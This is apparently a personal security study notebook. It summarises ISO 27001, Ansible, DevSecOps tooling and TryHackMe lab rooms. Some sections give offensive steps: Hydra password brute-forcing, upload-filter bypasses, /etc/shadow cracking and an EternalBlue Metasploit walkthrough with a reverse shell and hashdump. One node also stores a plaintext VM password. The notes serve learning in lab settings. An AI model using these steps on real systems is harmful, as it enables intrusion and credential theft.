- 2007, ISO 17799, se renombra a ser la ISO 27002:2005 y la ISO/IEC 27001 se publca una nueva version
- 2013, nueva version ISO/IEC 27001, evaluacion y tratamientos de los riesgos son agregados
- 2019, ISO 27001:2013: la ISO es estandar certificable

Principios generales:
- origen son los datos
- para que sean informacion se debe de hacer un proceso a los datos
- seguridad de la informacion, es la aplicacion de medidas, gestion y proteccion de los datos
- triada de la seguridad: disponibilidad, confidencialidad, integridad

sistema de gestion de seguridad
- este es el fin de la norma
- conjunto de politicas, procedimientos, guias, recursos y actividades asociadas
- el fin es:
   → establecer
   → implementar
   → operar
   → monitorizar
   → revisar
   → mantener
   → mejorar
- se deben de tener factores criticos definidos, los objetivos y actividades de seguridad deben estar alineadas con los objetivos de la organizacion
- el apoyo visible y el compromiso de todos los niveles de la organizacion, empezando desde alta direccion
- programas de concienciacion, formacion y educacion sbre seguridad de la informacion
- un proceso eficaz de gestion de incidentes
- un sistema de medicion, se evaluan los cambios y se van ajustando de acuerdo a la necesidad
- beneficios
   → aumentar la confianza en la organizacion
   → ayuda a la alta direccion a tomar decisiones de negocio

Terminos y definiciones
- Control de acceso, por donde se accede que este autorizado y restringido, dependiendo del negocio y seguridad, es un ciclo de vida tambien para el usuario
- auditoria, proceso de revision independiente y objetiva para la mejora continua del proceso
- alcance de auditoria, extensiones y limites a donde llegar
- conformidad, cumplimiento de un requisito
- competencia, capacidad para evaluar, eso es del auditor que va a hacer las pruebas
- mejora continua, revisar continuamente para que el sistema de seguridad debe de ser mas robusto
- control, medida que modifica un riesgo
- objetivo de control, lograr el objetivo al que se queire llegar con la norma
- accion correctiva, cuando se tiene una no conformidad, se debe de corregir
- evento, ocurrencia o cambio en un sistema
- incidente de SI, algo que puede afectar los elementos principales del sistema

Que es la ISO 27001
- norma internacional se ha preparado para proporcionar los requisitos para el establecimeinto, implementacion, mantenimiento y mejora continua de un sistema de gestion de la seguridad de la informacion
- generalidades
   → puede ser utilizada por partes internas y externas, para evaluarse a si mismos
   → describe el conjunto y el vocabulario de los sistemas de gestion de ls SI
   → el orden en que la norma presenta los requisitos no indica su importancia ni implica el orden en el cual deben implementarse
- la norma se divide en 14 grupos en 114 controles
- hay una seccion adicional sobre la subcontratacion
- la ISO 27000 abarca todo lo que tiene que ver con sistemas de la informacion, toda norma de seguridad es estar citando a esta misma norma

Liderazgo y planificacion
- contexto de la organizacion, entender donde estoy yo ubicado en al compania y que tipo de compania es, saber que necesita la organizacion, se debe de entender el negocio
- items
   → comprension de la organizacion y su contexto
   → comprension de las necesidades y expectativas de las partes interesadas
   → determinacion del alcance del sistema de gestion de la seguridad de la informacion
   → sistema de gestion de la seguridad de la informacion
- liderazgo
   → la alta direccion debe demostrar liderazgo y compromiso
   → generacion de la politica
   → roles, responsabilidades y autoridades en la organizacion, es complicado que una persona lleve todo el proceso
- planificacion, se debe de saber por donde se va a ir avanzando, alcance y que queremos lograr
   → acciones para tratar los riesgos y oportunidades
   → objetivos de seguridad de la informacion y planificacion para su consecucion

Soporte, operacion, evaluacion y mejora
- soporte, la organizacion debe de entregar los recursos para poder efectuar las mejoras
   → recursos
   → competencias
   → concienciacion
   → comunicacion
   → informacion documentada
- operacion, ya se tiene la planificacion, aqui se implementa todo
   → planificacion y control operacional
   → apreciacion de los riesgos de seguridad de la informacion
   → tratamiento de los riesgos de seguridad de la informacion
- evaluacion del desempenio
   → la organizacion debe evauar el desempenio de la seguridad de la informacion
   → seguimiento, medicion, analisis y evaluacion
   → auditoria interna, lo mejor es que sea alguien externo quien lo cheque
   → revision por la direccion
- mejora, siempre se debe de evaluar la necesidad de acciones
   → no conformidad y acciones correctivas

Anexo A (los controles 4 al 10 son mandatorios para obtener la certifciacion)
- provee una herramienta esencial apra la gestion de la seguridad, una lista de los controles de seguridad que pueden ser usados para la mejora
- contiene dos controles, como deben de ser escritas y revisadas las politicas
- organizacion de la seguridad de la informacion, como se asigna responsabilidades, se tiene 7 controles
- seguridad de los recursos humanos, son 6, estos son a niveles generales cuando contratas
- gestion de activos, se tienen 10, se tiene que tener un inventario de todos los recursos que se tiene, se debe de capacitar para que el trabajo sea propio de la organizacion
- control de acceso, se tienen 14, como se debe de gestionar el ciclo de vida de los usuario, monitoreo constante de los usuarios
- criptografia, se tienen 2, tener en cuenta todo lo que es intercambio de cambios de informacion
- seguridad fisica y del entorno, se tienen 15, como se debe de tener en ceunta las instalaciones, zonas restringidas, se debe de asegurar un borrado a bajo nivel cuando se deshace de uno de los equipos
- seguridad de las operaciones, 15, operacion pura deTI, se debe de tener segregacion de entornos, habla de herramientas a aplicar
- seguridad de las comunicaciones, 7, aqui se maneja las redes, como deben de estar seguras las redes de la organizacion
- adquisicion, desarrollo y mantenimiento de los sistemas de informacion, 13, todo lo que se tiene que tener en cuenta en el desarrollo de un sistema de informacion, se puede tener el software de un tercero, ciclo de vida correcto del desarrollo
- relacion con proveedores, 5, que se debe de tener en cuenta al generar un contrato, cual debe de ser la relacion
- gestion de incidentes de seguridad de la informacion, 7, que se debe de hacer cuando pasa algun incidente
- aspectos de seguridad de la informacion para la gestion de la continuidad de negocio, 4, habla que se debe de hacer para garantizar que a operacion debe de seguir trabajando
- cumplimiento, 8, aqui se debe alinear a lo que pide la certificacion de toda la normatividad</rich_text>
    </node>
    <node name="intro al Backend" unique_id="144" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684292553" ts_lastsave="1684292837">
      <rich_text>IOT puede ser parte de un frontend</rich_text>
    </node>
    <node name="ansible" unique_id="168" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688524216" ts_lastsave="1692993730">
      <rich_text>Password maquina virtual: 12345678 o master

plataforma de software libre para configurar y administrar servidores
instalacion multinodo
ejecucion de tareas ad hoc y administracion de servidores
se usa atravez de ssh, necesita python2.4+
uso de JSON o YAML

inline: ansible -m shell -a ‘cmmand’ -i inventory {servers}
ansible -m ping -i inventory {servers}
para ejecutart comandos como root se usa la bandera -b o --become 
checar los playbook: ansible-playbook -C {playbook} -i {inventory}, para ejecutar se quita la bandera -C

ansible -m setup -i inventory {server}, para obtener un setup del servidor, se usa generalmente para saber que tipo de os es</rich_text>
    </node>
    <node name="docker-security" unique_id="169" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688584989" ts_lastsave="1688587132">
      <rich_text>tools:
	AQUA, Prisma Cloud, Snyk, commercial tools
	free or open source: snyk community edition, trivy
	GIT secrets, security plugins in any IDE, trufflehog
		sonarqube - quality code
		sast - fortify, veracode, checkmarx
		sca - fortify, veracode, blackduck, snyk
		dast - owasp zap, webinspect, veracode, dast, acunetix
		iac - bridfecrew, synk
		containers - aqua, qualys, prismacloud
	pipeline tools, jenkins, aws, github actions, gitlab
	cloud security posture management tools - aqua, bridgecrew
	container registry scanning tools - aqua, aws native registry scanning
	infrastructure scanning tools - chef inspect, nessus
	cloud security tools - aws security hub, azure defender
	
	
basic terms
- SAST, static application security testing, whitebox
- SCA, software composition analysis
- DAST, dynamic application security testing, black-box security testing
- IAST, interactive application security testing, inlcude sast and dast
- IAC, infrastructure as code
- API security, process to identify security issues in API
- shift left approach is devsecops</rich_text>
    </node>
    <node name="Servidores web" unique_id="176" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694987488" ts_lastsave="1694987488"/>
  </node>
  <node name="TryHackMe" unique_id="149" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1685939072" ts_lastsave="1707184432">
    <rich_text>good url:

TO CHECK VULNERABILITIES
</rich_text>
    <rich_text link="webs https://www.exploit-db.com/">https://www.exploit-db.com/</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://nvd.nist.gov/vuln/search">https://nvd.nist.gov/vuln/search</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://cve.mitre.org/">https://cve.mitre.org/</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://pypi.org/project/hashID/">https://pypi.org/project/hashID/</rich_text>
    <rich_text>
</rich_text>
    <rich_text link="webs https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://iplocation.io/ip/170.83.76.219">https://iplocation.io/ip/170.83.76.219</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://gtfobins.github.io/">https://gtfobins.github.io/</rich_text>
    <rich_text>

</rich_text>
    <rich_text scale="h2">Your Cleverbridge reference number: 431182666</rich_text>
    <rich_text>

</rich_text>
    <rich_text link="webs https://github.com/postfinance/kubenurse">https://github.com/postfinance/kubenurse</rich_text>
    <node name="Path Beginer" unique_id="192" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="10" is_bold="0" foreground="" ts_creation="1700447328" ts_lastsave="1707540256">
      <node name="Introductory Networking" unique_id="193" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700447369" ts_lastsave="1700527383">
        <rich_text>OSI Model
- Application
- Presentation
- Session
- Transport
- Network
- Data Link
- Physical

ping use of ICMP protocol, work in network layer of OSI model, internet layer on TCP/IP model
traceroute map the path request, in win use ICMP and unix-like us UDP
WHOIS, query who a domain name is registered to
DIG, </rich_text>
      </node>
      <node name="Nmap" unique_id="194" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1700602042" ts_lastsave="1700675991">
        <rich_text>knowledge is power, we need to establisj which services are running on the targets
depending of port is probably get the service running in the server
nmap is used to perform many different kinds of port scan
nmap running on terminal

scan basic types
- TCP connect scan -sT
- SYN “half-open” scan -sS
- UDP scans -sU
- TCP Null scans -sN
- TCP FUN scans -sF
- TCP Xmas scans -sX

-sT, three-way handshake, connect terminal, sends a TCP request with SYN flag and TCP response with SYN flag, as wee as the ACK flag
request with SYN flag set to closed, server respond with a TCP packet with RST flag
with a simple drop incoming packets (nothing back) firewall is configured

-sS, used to port-range, referred as half-open or stealth, SYN sends back a RST TCP packetafter receiving SYN/ACK
advantages:
- bypass older intrusion detection sustems
- SYN scans are often not logged by application listening on open ports
- this is significantly faster than a standard TCP connect scan
Disadventages:
- require sudo permission, permission of create raw packets
- unstable services are sometimes brought down by SYN scans
This is a default scans used by nmap

UDP scans
stateless connections, connection with a back-and-forth handshake, the lack of acknowledgement makes UDP significantly more difficult
use of -sU
to open port there should be no response, states: open|filtered, but is possible that the port is open or firewalled
when port is closed this should respond an ICMP packet
good practice use: --top-ports &lt;number&gt;
nmap sends empty requests, raw UDP packets

NULL, FIN and Xmas
less commonly used
NULL, -sN, TCP request is sent with no flags, should respond with RST if the port is closed
FIN scans, -sF, sending complety empty packet, use with FIN flag, expects a RST if port is closed
Xmas scans, -sX, send a malformed TCP packet and expects a RST response for closed ports, flags: PSH, URG and FIN
this only detects open|filtered, closed or filtered, response ICMP unreachable packets
microsoft windows and lot of Cisco network response RST to any malformed TPC packet

ICMP networking Scanning
- firts objective is obtain map of the network structure, ips with active hosts
- ping sweep, this send ICMP to each possible IP
- to use: -sn with a range of IP, nmap -sn 192.168.0.1-254 or nmap -sn 192.168.0.0/24</rich_text>
      </node>
      <node name="Network Services" unique_id="195" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1700952467" ts_lastsave="1703032458">
        <rich_text>SMB
- server message block protocol, used for sharing access to files, printest, serial ports and other resources
- response-request protocol, transmit multiple message between the client and server
- connect with NetBIOS over TCP/IP, NetBEUI or IPX/SPX
- before connection is possible use commands
- from 95 windows support SMB, in linux use Samba
- use of enumeration to find potential attack vectors
- is a good point of begin to get information about network and services
- use of enum4linux

TELNET
- application protocol to connect and execute commands
- this send messages in clear text
- this was replaced by ssh
- to connect : `telnet ip port`
- types of exploiting:
   → breakdown, poorly hidden telnet service, marked as backdoor, get the username
   → reverse shell, shell to communicate back to the attacking machine

FTP
- protocol to transfer files over network
- uses client-server model
- operates two channels:
   → a command channel or control
   → a data channel
- while session is open the client may execute FTP commands
- active, this ioen a port and listens
- passive, the server opens a port and listens and the client connects to it
- Types of exploits
   → command and channels are unencrypted
   → use of man in the middle attack
   → ARP poisoning
   → Breakdown, ftp is running in the server, we have a possible username'
   → Hydra, online password cracking tool, use of dictionary for 50 protocols
   → use of hydra: hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV ip protocol

NFS
- Netwok file system, share files and directories
- this mount a partion of filesystem
- ths client request to mount a directory from a remote host on a local directory
- this connect bu RPC
- server check if user has permission to mount
- use of nfs-common
- common use to escalate privileges
- root_squash is used to avoid connections by root
- common use of SUID bit set to execute commands with anther permissions

SMTP
- Simple Mail transfer Protocol
- used to send emails
- functions:
   → verified who is sending
   → sends the outgoing mail
   → if not is possible outgoing it sends te message back
- POP is mor simple, only download from the mail server
- SMTP syncrhonise the current inbox
- default port: 25

MySQL
- relational database based in sql
- persistent, organised collection of structured data
- is only brand name for one of the most popular RDBMS software implementations</rich_text>
      </node>
      <node name="OWASP Juice Shop" unique_id="221" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1703107505" ts_lastsave="1705108886"/>
      <node name="Upload vulnerabilities" unique_id="240" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1704813054" ts_lastsave="1705630962">
        <rich_text>Introduction
- integral part of how we interact with web apps
- applications for file upload features are limitless
- when handled badly, file uploadscan also open vulnerabilities in the server
- the way up to full remote code execution (RCE)
- injection of malicious webpages, vulnerabilities such as XSS or CSRF
- purpose:
   → Overwritting existing files on a server
   → uploading and executing shells on a server
   → bypassing client-side filtering
   → bypassing varios kinds of server-side filtering
   → fooling content type validation checks

General methodology
- enumeration is key
- understand about our environment
- scanning with a directory bruteforcer sush as gobuster
- intercept requests with burpsuite
- browser extension such as wappalyser can prove valuable information

Overwriting exisiting files
- to does not overwrite file the system execute multiple checks
- common is assing new name
- use of file permission on the server

Remote code execution
- allow us to execute code arbitrarily on the web server
- even with a low-privileged user account is very extremely serious vulnerability
- common is used the same language like backend
- exists 2 basic ways:
   → webshells
   → reverse/bind shells, this is most ideal
- pentest monkey reverse shell

Filtering
- defensive versus this techniques
- client-side filtering, this run over user's browser, , it is trivially easy to pass
- server-side filtering, run over server, this is more dificult to pass
- types of filtering:
   → extension validation: using a blacklist of extensions files
   → File type fitlering: more intensive, file type filtering looks, two types of file validations:
      ⇒ MIME validation: used as an identifier for files
      ⇒ Magic number validation: accurate way of determining the content of a file, is a string of bytes at the very beginning of the file content wich identify the content
   → File length filtering: used to prevent huge files
   → File name filtering: in a files, name should be unique, adding a random aspect to the file name, file name should be sanitised for bad characters
   → File content filtering: more complicated filtering systems may scan the full contents of an uploaded file

Bypassing client side filtering
- firts and weakest line of defense
- is easy to bypass
- four easy ways to bypass:
   → turn off javascript: work if site doesn't require javascript in order to provide basic functionality
   → Intercept and modify the incomming page: using burpsuite to intercept the incmoming web page and strip out the javascript
   → Intercept and modify the file upload: previous method works before the webpage is loaded, this allow the web page load as normal, but intercepts the file upload
   → Send the file directly to the upload point: sending using curl using: curl -X POST -f “submit:&lt;value&gt;” -F “&lt;file-parameter&gt;:@&lt;path-to-file&gt;” &lt;site&gt;

Bypassing server-side filtering: file extensions
- when can't see or manipulate the code
- put together a payload which conforms to the restrictions
- use of another extensions, for example in php: php3, php4, php5

Bypassing server-side filtering: magic numbers
- used as a more accurate identifier of files
- string of hex digits, always the first thing in a file
- used to validate file iploads, using this with white or black list

Example methodology
- steps to follow (create own methodology):
   → use of browser extension such as the aforementioned Wappalyzer, this is to know languages and frameworks the web application, manually is use burpsuite to intercept response with headers like, server or x-powered-by
   → with the page analize the source code for client-side to check is if possible use side filter 
   → check how to access the uploaded file, use of gobuster
      ⇒ is important the flag -x to check extensions: php,txt,html
   → attempt at malicious file upload
- assuming fail:
   → if extension fails is using a blacklist to filter files, use any extension filter will be operating on a whitelist
   → try re-uploading original innocent file, but change the magic number
   → try upload file, but intercept the request with burpsuit and change the MIME
   → enumerating file length filter is a case of uploading a small file, and before upload a bigger files</rich_text>
      </node>
      <node name="Hashing Crypto 101" unique_id="242" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1705631737" ts_lastsave="1705729191">
        <rich_text>Key terms
- plaintext, data before encryption or hashing, not only text
- encoding, not a form of encryption, form of representation
- hash, output of a hash function, ver “to hash”, produce the hash value of some data
- brute force, attacking cryptography by truing every different password or another key
- cryptanalysis, attacking cryptography by finding a weakness in the undelying maths

What is a hash function?
- different forms of encryption
- takes som input data of any size and creates a summary or digest of that data.
- is hard to predict the output
- good hahsing will be fast to compute (relative) and slow of reverse
- with a small change in the input should cuase a large change in the output
- Why should I care?, used in multiple context, in password generally
- hash collision, 2 different inputs give the same output
   → hash function are designed to avoid this as best as they can
   → collisions are note avoidable, pigeonhole effect
   → MD5 and SHA1 has hash collision

Uses for hashing
- user for verify integrity of data or verifying password
   → password verification
      ⇒ not save in text plain
      ⇒ rockyou.txt is a file over 14 million passwords
   → protecting against rainbow table
      ⇒ use of salt to the password, this is randomly generated and stored in the database
      ⇒ salt is added to either the start or the end of the password before it's hashed 

Recognising password hashes
- automated hash recognition tools such as hashID
- unix style password are very easy to recognisem this contains a prefix
- standard format is $format$rounds$salt$hash
- windows password using NTLM, is a variant of MD4
- in linux hashes are stored in /etc/shadow
- in windows password are stored in the SAM, use of tools like mimekatz
- hashes in unix style:
   → $1$, md5crypt, used in cisco stuff and older unix systems
   → $2$, $2a$, $2b$, $2x$, $2y$, Bcrypt, popular for web apps
   → $6$, sha512crypy

Password cracking
- not is possible decrypt password hashes
- used rockyou for crack the password
- when match you know the password
- use of tools like hashcat and john the ripper

Why crack on GPUs?
- use of thousand of cores
- is very good with maths
- is more quickly to crack

Cracking on VMs?
- use of hashcat it is best in host
- john the reaper uses CPU by default
- Never use --force for hashcat, it can lead to false positives

Hashing for integrity checking
- used to check that files haven't been changed
- used to check that files haven't been modified
- HMACs
   → method of using a cryptographic hashing function to check authenticity and integrity of data</rich_text>
      </node>
      <node name="John the ripper" unique_id="243" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1705797580" ts_lastsave="1706468802">
        <rich_text>john who?
- john the ripper is one of the most well know hash cracking
- fast cracking speed + range of compatible hash types
- 32 chars standard to MD5 hash
- hashes are designed to operate one way, reverse operation from output to input is a problem P vs NP
- with hashed version and large number of word is possible cracked
- dictionary attack

Cracking basic hashes
- exists multiple ways to use
- basic sintax: john [options] [path to file]

Automatic Cracking
- is possible detect type of hash and select appropriate rules and formats to crack
- this is not always the best way
- use: john --vordlist=[path of wordlist] [path to file]

Identifying hashes
- is necesary use another tools to identify the hash
- use of: </rich_text>
        <rich_text link="webs https://hashes.com/en/tools/hash_identifier">https://hashes.com/en/tools/hash_identifier</rich_text>
        <rich_text>
- use of hash-identifier tool of python, this is necesary download

Format-Specific cracking
- to use with the hash is identifier: john --format=[format] --wordlist=[path of wordlist] [path to file]
- if is a common hash is necesary add raw in format
- use of john --list=formats

Cracking windows hashes
- something a little bit more difficult
- NTHash/NTLM, format in modern windows, is possible acquire dumping the SAM database, use of tools like mimikatz or active directory database

Cracking hashes from /etc/shadow
- /etc/shadow is where password hashed are stored, another information
- one line ofr each user or user account of the system
- only acessible by the root user
- is necesary combine with the /etc/passwd file
- use of unshadow: unshadow [path /etc/passwd] [path /etc/shadow]
- ex: unshadow local_passwd local_shadow &gt; unshadowed.txt
- in some cases is necesary use: --format=sha256crypt

Single crack mode
- use only the information provided in the username, use or possible passwords heuristically
- change and add numbers or use of upper cases with the user
- generally of poor passwords
- Gecos field of the UNIX and another UNIX-like
- every field separated by “:” us a GECOS
- using: john --single --format=[format] [path to file]

Custom rules
- used in single crack, is possible define your own sets of rules
- used in special format of password, use of capital letter, number and symbols
- how to create:
   → is defined in john.conf, usually in /etc/john/john.conf
   → pattern: [List.Rules:THMRules], use of regex
   → how to define: [List.Rules:PoloPassword]: \n cAZ"[0-9] [!$%@]"
- to use custom rules: john --wordlist=[path of wordlist] --rule=[name rule] [path file]

Cracking password protected zip files
- is possible use john to crack password in zip files
- zip2john, convert the zip file into a hash format
- use: zip2john [options] [zip file] &gt; [output file]

Cracking password protected rar archives
- is a similar process to get password with zip
- use: ra2john [rar file] &gt; [output file]
- use rar2john rarfile.rar &gt; rar_hash.txt

Before 2 process use john to rar_hash file

Cracking SSH keys with john
- is semi-frequently in CTF
- john to crack the SSH private key password of id_rsa files
- this used ssh2john
- use: ssh2john [id_rsa private key file] &gt; [output file]
- ex: ssh2john id_rsa &gt; id_rsa_hash.txt

to cracking: john --wordlist=/usr/share/wordlits/rockyou.txt [file]</rich_text>
      </node>
      <node name="Encryption - crypto 101" unique_id="244" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1706221821" ts_lastsave="1706470252">
        <rich_text>Key Terms
- ciphertext, result of encrypting a plain text
- Cipher, method of encrypting or decrypting data
- plaintext, data before encrypting
- Encryption, transforming data into ciphertext
- Encoding, NOT a form of encryption, data representation
- Key, information is needed to correctly decrypt
- Passphrase, separate to the key, similar to password and used to protect a key
- Asymmetric encryption, uses different keys to encrypt and decrypt
- Symmetric encryption, uses the same key to encrypt and decrypt
- Brute force, attacking to testing different password or every key
- Cryptoanalysis, finding a weakness in the underlying maths
- Alice and Bob, used to represent 2 people who generally wanto to communicate.

Why is encryption important?
- used to protect confidentiality, ensure integrity, ensure authenticity
- in SSH, use an encrypted tunnel so that no one can snoop on your session
- in bank is used a certificate that use cryptography
- use of checksum to verify data
- rarely interact directly with cryptography
- in sensitive user data needs to be stores, use standard like PCI-DSS 
- medical data has similar standards

Crucial crypto maths
- use of modulo operator
- with large numbers, use programming languages
- python is good for this as integers are unlimited in size
- modulo is a remainders in division
- modulo is no reversible

Types of encryption
- two main categories
   → symmetric, use the same key to encrypt and decrypt te data, examples: DES and AES, to be faster, use of smaller keys (128 or 256 bits for AES, DES are 56 bits long)
   → asymmetric, use a pair of keys, one to encrypt and the other to decrypt. Referred to public and private key, data encrypted with the private key can be decrypted with public key, and vice versa, this is slower and uses larger keys, RSA use 2048 to 4096 bit 

RSA - Rivest Shamir Adlemn
- RSA is based on the mathematically dificult problem of working out the factor of a large number
- relatively often in CTFs, normally requiring you to calculate variables or break some encryption base on them
- tools for defeating RSA: </rich_text>
        <rich_text link="webs https://github.com/RsaCtfTool/RsaCtfTool">https://github.com/RsaCtfTool/RsaCtfTool</rich_text>
        <rich_text>, </rich_text>
        <rich_text link="webs https://github.com/ius/rsatool">https://github.com/ius/rsatool</rich_text>
        <rich_text>
- p and q are large prime numbers, n is a product of p and q
- the public key is n and e, the private key is n and d
- m is a message in plain text and c represents the ciphertext
- Crypto CTF challenger often present you with a set of these values, and you need to break the encryption and decrypt a message to retrieve the flag

Estableshing keys using asymmetric cryptography
- use of exchanging keys for symmetric encryption
- this tends to be slower, for HTTP symmetric is beeter
- the lock is the server's public key and the key represents the server's private key

Digital Signatures  and Certificates
- a way to probe the authenticity of files, who creates and modified
- with asymmetric crypto, is produced a signature with private key and it can be verified with public key
- Certificates, web servers contains a certificate that say if is real
- using chain of trust, starting with root CA, this is trusted in device, OS or browser

SSH Authentication
- by default in ssh use usernames and passswords in the same way
- is possible use public and private keys to prove that the client is valid and authorised
- by default is used RSA Keys, is possible choose another algorithm, add/or passphrase
- use of ssh-keygen
- the private keys is like password for the user
- the passphrase is used only to decrypt the key not to verify within server
- when is used by the server, the keys should be created in local machine and copy the public key in the server
- ssh keys are an excellent way to upgrade a reverse shell, assuming the user has login enabled

Explaing Diffie hellman key exchange
- allows 2 people/parties to establish a set of common cryptographic keys, to establishing common symmetric keys
- DH key exchange is when is necessary a security talk but without key exchange with asymmetric crypto
- used RSA public key
- prevents attacks of man-in-the-middle

PGP, GPG and AES
- PGP, Pretty Good Privacy, software that implements encryption for encrypting files
- GPG, GnuPG is an OpenSource of PGP, used to decrypt files in CTFs, private key can be protected with passphrases in a similar way to SSH, is possible use gpg2john to break passphrase
- AES, called Rijndael, is Advanced Encryption Standard, it was replace for DES</rich_text>
      </node>
      <node name="Active directory basics" unique_id="245" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1706470884" ts_lastsave="1706813058">
        <rich_text>Introduction
- Is the backbone of the corporate world
- management of devices and users

Windows Domain
- is a group of users and computers under the administration of a given business
- centralise the administration of common components in a single repository called Active Directory (AD)
- The server that runs the AD is a Doamin Controller(DC)
- Main advantages:
   → Centralised identity management, configure user with minimum effort
   → Managing security policies: configure policies and apply to users and computers

Active directory
- acts as a catalog that holds the information of all of the objects
- support objects: users, groups, machines, printers, shares and many objects
- Objects:
   → Users, the most common object, known as security principals, this can authenticated and can be assigned privileges over resources, two types of entities:
      ⇒ People, persons in your organization that need access the network
      ⇒ Services, define users to be like IIS or MSSQL, every service requires a user to run
   → Machines, every compute that joins the AD domain, this will be created, consider security principals, password are automatically rotated (120 random chars), machine identify with {name}$
   → Security groups, access rights to files or other resources, better manegeability, can have both users and machines as members

Managing Users in AD
- the first task is check exisitng AD OUs and users and recents changes have happened to the business
- by default OUs are protected against accidental deletetion
- activate advanced features in the view menu
- in object and disable accidental delete protection
- give specific users some control over some OUs, this is known as delegation and allows you to grant users specific privileges

Managing Computers in AD
- by default all the machines that join a domain will be put in the container called “Computers”
- is possible see some computers, laptops and servers
- workstations, most common deviceswithin an AD, user -&gt; workstation
- servers, the second most common device within an AD, to provide services to users or other servers
- Domain controllers, allow to manage the AD, the most sensitive devices within the network as they contain hashed passwords

Group Policies
- the principal idea is be able to deploy different policies for each OU
- push different configurations and security baselines
- policies like Group Policy Objects (GPO), is a collection of settings that can be applied to OUs
- to configure use Group Policy Management
- GPO are distributed to the network via a network share called SYSVOL, share points in C:\Windows\SYSVOL\sysvol\
- the update might take up to 2 hours, to force: gpupdate /force

Authentication methods
- credential are stored in the domain controller, two protocols for network authentication:
   → Kerberos: used in recent version of windows, this is default, will be assinged tockets - proof of a previous authentication, process:
      ⇒ user send their username and a timestamp encrypted, using key derived from their password to the Key Distribution Center, this response Ticket Granting Ticket, TGT is encrypted usgin the krbtgt protocol
      ⇒ for new services user use their TGT this ask for a Ticket Granting Service, using TGT and Service Principal Name indicates the service and server name we intend to access, TGS send as a result, KDC send us a TGS along with a Service Session Key, TGS is encrypted using a keyb derived from the Service Owner Hash
      ⇒ TGS can then be sent to the desired service to auth and establish a connection
   → netNTLM: legacy auth, only for compatibility purposes, the processes is:
      ⇒ sends an auth request to the server
      ⇒ server generate a random number and sends it as a challenge to the client
      ⇒ client combines their NTLM password hash, generate a response to the challenge and sends it back to the server for verification
      ⇒ server forwards the challenge and the response to the DC for verification
      ⇒ DC uses the challenge to recalculate the response and compares it to original response
      ⇒ the server forwards the auth result to the client

Trees, Forests and Trusts
- trees, using different laws and regulations, IT people in multiple countries, AD support multiple domains, every IT admin only access in the specific DC, use of Enterprises Admins group
- Forecast, is possible configured in different namespaces, is the union of multiple trees
- Trust relationship, authorizations froma a domain access to another</rich_text>
      </node>
      <node name="Eternal blue" unique_id="246" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="27" is_bold="0" foreground="" ts_creation="1706751218" ts_lastsave="1706814485">
        <rich_text>scan and learn what exploit this machine is vulnerable to

Recon
nmap -sV -vv --script vuln {ip}
ms-17-010

Exploit the machine
msfconsole
search ms-17-010
use 0
show options
set RHOSTS {ip}
set LHOST {local ip}
set payload windows/x64/shell/reverse_tcp
exploit
ctrl + z

Escalate
use post/multi/manage/shell_to_meterpreter
sessions -l
set SESSION 1
exploit
sessions 2
whoami
ps

Cracking
hashdump
copy line to file
john --wordlist=/usr/share/wordlists/rockyou.txt

Find the flag
flag2 in \Windows\system32\config</rich_text>
      </node>
      <node name="Common linux privesc" unique_id="247" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1706904870" ts_lastsave="1707539739">
        <rich_text>Understanding privesc
- going from a lower permission to a higher permission
- exploitation of vulnerabilities
- gain unauthorized access to resources
- is real world in CTF or penetretion tests the initial access is basic
- acctions:
   → reset passwords
   → bypass access controls to compromise protected data
   → edit software configurations
   → enable persistence, so you can access the machine again later
   → change privilege of users
   → get that cheeky root flag

Direction of privilege escalation
- there two main privilege escalation variants
   → Horizontal privesc, use of different users, with the same privilege level, use to gain another normal privilege user, use of SUID file attached to their home directory
   → Vertical privesc (privilege elevation), gain higher privileges or access, with an existing account that you have already comprised, hijacking account with administrator privileges or root privileges

Enumeration
- LinEnum, simple bash script, performs common commands related to privilefe escalation
- important that commands execute with LinEnum
- options:
   → kernel, information, exploitable available for this machine
   → we read/write sensitive files, files that any auth user can read and write to
   → SUID files, interesting items to escalate privileges. SUID is a special type of file permission give to a file
